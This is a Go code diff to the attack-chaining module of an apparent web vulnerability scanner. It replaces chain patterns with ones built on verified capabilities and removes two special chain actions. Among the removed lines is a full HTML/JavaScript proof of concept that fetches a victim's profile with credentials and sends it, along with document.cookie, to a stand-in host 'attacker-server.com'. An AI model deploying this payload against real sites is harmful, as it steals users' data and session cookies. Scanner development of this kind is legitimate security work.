@@ -23,60 +23,57 @@ type Chainer struct {
 func NewChainer() *Chainer {
 	return &Chainer{
 		executed: make(map[string]bool),
+		// Every Requires name below is a capability an action records at
+		// OriginVerified (executed evidence only). Chains built on names
+		// the origin-graded model NEVER verifies were the previous
+		// failure: has_cors / has_idor / has_register / has_forged_jwt
+		// and the has_xss / has_admin spellings exist only as
+		// remote-text hints, so those patterns could never fire and the
+		// chaining subsystem was decorative. A chain is still only a
+		// HYPOTHESIS assembled from verified primitives (the scanner
+		// contacts nothing here) and is reported as SevInfo.
 		patterns: []ChainPattern{
 			{
-				Name:     "CORS → XSS Data Exfiltration",
-				Requires: []string{"has_cors", "has_xss"},
-				Impact:   "Data exfiltration via CORS + XSS — steal sensitive data cross-origin",
+				Name:     "RCE → Full Compromise",
+				Requires: []string{"has_rce"},
+				Impact:   "A command was executed on the target — remote code execution, full host compromise",
+				Risk:     10.0,
+			},
+			{
+				Name:     "SQLi → Data Exfiltration",
+				Requires: []string{"has_sqli_exploit"},
+				Impact:   "Differential-confirmed SQL injection can read other users' rows and dump the database",
 				Risk:     9.0,
 			},
 			{
-				Name:     "JWT → Admin Access",
-				Requires: []string{"has_forged_jwt", "has_admin"},
-				Impact:   "Account takeover via forged JWT used against admin endpoints",
-				Risk:     9.5,
-			},
-			{
-				Name:     "Token → Admin Access",
-				Requires: []string{"has_token", "has_admin"},
-				Impact:   "Privilege escalation via reused token on admin endpoints",
+				Name:     "XSS → Session Hijack",
+				Requires: []string{"has_xss_exploit", "has_token"},
+				Impact:   "Confirmed executable XSS reflection against a live session token can steal cookies / bearer tokens",
 				Risk:     8.5,
 			},
 			{
-				Name:     "Credentials → Login → Admin",
-				Requires: []string{"has_login", "has_admin"},
-				Impact:   "Valid credentials provide access to admin panel",
-				Risk:     9.0,
-			},
-			{
-				Name:     "CORS → API Access",
-				Requires: []string{"has_cors", "has_api"},
-				Impact:   "Cross-origin requests allowed to API — potential data access",
-				Risk:     7.0,
-			},
-			{
-				Name:     "IDOR → Data Access",
-				Requires: []string{"has_idor"},
-				Impact:   "Insecure direct object reference allows accessing other users' data",
-				Risk:     8.0,
+				Name:     "Login → Verified Admin Session",
+				Requires: []string{"has_login", "has_admin_session"},
+				Impact:   "A real login form plus a differential-confirmed authenticated surface means credentialed access was exercised",
+				Risk:     8.5,
 			},
 			{
 				Name:     "Secrets → Cloud Compromise",
 				Requires: []string{"has_secret"},
-				Impact:   "Exposed secrets (AWS keys, tokens) allow cloud account compromise",
+				Impact:   "Exposed secrets (AWS keys, tokens) captured by an executed read allow cloud account compromise",
 				Risk:     10.0,
 			},
 			{
 				Name:     "Upload → RCE",
 				Requires: []string{"has_upload"},
-				Impact:   "Unrestricted file upload allows remote code execution",
-				Risk:     10.0,
+				Impact:   "A real file-upload input is the entry point for webshell / remote code execution (execution not demonstrated by this chain)",
+				Risk:     9.0,
 			},
 			{
-				Name:     "Login → Register → Privilege Escalation",
-				Requires: []string{"has_login", "has_register"},
-				Impact:   "Registration with elevated privileges leads to account takeover",
-				Risk:     8.0,
+				Name:     "Token Reuse → Authenticated Surface",
+				Requires: []string{"has_token", "has_login"},
+				Impact:   "A captured session token replayed against the login-protected surface may grant access without credentials",
+				Risk:     7.0,
 			},
 		},
 	}
@@ -116,17 +113,7 @@ func (c *Chainer) DetectAndExecute(ctx context.Context, target string, kb *Knowl
 
 		c.executed[p.Name] = true
 
-		var chainAction Action
-		switch p.Name {
-		case "CORS → XSS Data Exfiltration":
-			chainAction = &CORSXSSChainAction{pattern: p}
-		case "JWT → Admin Access":
-			chainAction = &JWTAdminChainAction{pattern: p}
-		default:
-			chainAction = &GenericChainAction{pattern: p}
-		}
-
-		spawned = append(spawned, chainAction)
+		spawned = append(spawned, &GenericChainAction{pattern: p})
 	}
 	return spawned
 }
@@ -197,115 +184,5 @@ func (a *GenericChainAction) Execute(ctx context.Context, target string, kb *Kno
 			},
 		},
 	}
-	return ActionResult{Findings: findings}
-}
-
-type CORSXSSChainAction struct {
-	pattern ChainPattern
-}
-
-func (a *CORSXSSChainAction) Metadata() ActionMetadata {
-	return ActionMetadata{
-		Name:        "Chain: CORS+XSS Data Exfil",
-		Description: "Generate PoC HTML that exfiltrates data via CORS",
-		Priority:    1,
-		Requires:    []string{"has_cors", "has_xss"},
-		Provides:    []string{},
-	}
-}
-
-func (a *CORSXSSChainAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
-	pocHTML := `<!DOCTYPE html>
-<html>
-<body>
-<script>
-  // CORS + XSS Data Exfiltration PoC
-  // Generated by NICE HACKER Decision Engine
-  
-  const TARGET = "` + target + `";
-  const CALLBACK = "https://attacker-server.com/exfil";
-  
-  async function exfil() {
-    try {
-      const resp = await fetch(TARGET + "/api/user/profile", {
-        credentials: "include"
-      });
-      const data = await resp.text();
-      
-      // Exfiltrate via callback
-      await fetch(CALLBACK + "?data=" + btoa(data));
-      
-      // Also try to steal cookies
-      document.location = CALLBACK + "?cookie=" + document.cookie;
-    } catch(e) {
-      // Try image beacon fallback
-      new Image().src = CALLBACK + "?error=" + encodeURIComponent(e.message);
-    }
-  }
-  
-  exfil();
-</script>
-</body>
-</html>`
-
-	// The PoC HTML is scanner output (a generated artifact), not a secret
-	// captured on the target. Recording it as a "secret" used to flip
-	// has_secret and fabricate a critical-risk "data breach" report.
-	kb.AddScannerState("CORS+XSS PoC generated — manual deployment required")
-
-	findings := []Finding{
-		{
-			Type:        "chain_exploit_poc",
-			Name:        "CORS+XSS Data Exfiltration — PoC generated (not detonated)",
-			Severity:    SevInfo,
-			Description: "Generated crafted HTML page for manual exfiltration testing via CORS + XSS — the scanner did not deploy or run it",
-			Evidence:    pocHTML[:300] + "...",
-			Details:     map[string]string{"html": pocHTML, "status": "operator_tool"},
-		},
-	}
-	return ActionResult{Findings: findings}
-}
-
-type JWTAdminChainAction struct {
-	pattern ChainPattern
-}
-
-func (a *JWTAdminChainAction) Metadata() ActionMetadata {
-	return ActionMetadata{
-		Name:        "Chain: JWT → Admin PWN",
-		Description: "Use forged JWT to access admin endpoints",
-		Priority:    1,
-		Requires:    []string{"has_forged_jwt", "has_admin"},
-		Provides:    []string{},
-	}
-}
-
-func (a *JWTAdminChainAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
-	jwtToken := kb.Session.GetActiveJWT()
-	findings := []Finding{
-		{
-			Type:        "chain_exploit_jwt_admin",
-			Name:        "JWT → Admin Access hypothesis (not executed)",
-			Severity:    SevInfo,
-			Description: fmt.Sprintf("Forged JWT available for manual testing against admin endpoints on %s — the scanner contacted nothing", target),
-			Evidence:    fmt.Sprintf("Token: %s", jwtToken),
-		},
-	}
-
-	if jwtToken != "" {
-		kb.Session.SetActiveJWT(jwtToken)
-		// No admin endpoint was actually contacted: recording an "admin
-		// session" capability as verified here fabricated a takeover the
-		// scanner never executed. Keep it as a suspected capability.
-		kb.AddCapability(Capability{
-			Name:   "has_admin_session",
-			Origin: OriginHint, // chain hypothesis, not executed access
-			Target: target,
-			Details: map[string]string{
-				"derivedBy": "forged JWT available, admin endpoint untested",
-			},
-		})
-	}
-
 	return ActionResult{Findings: findings}
 }
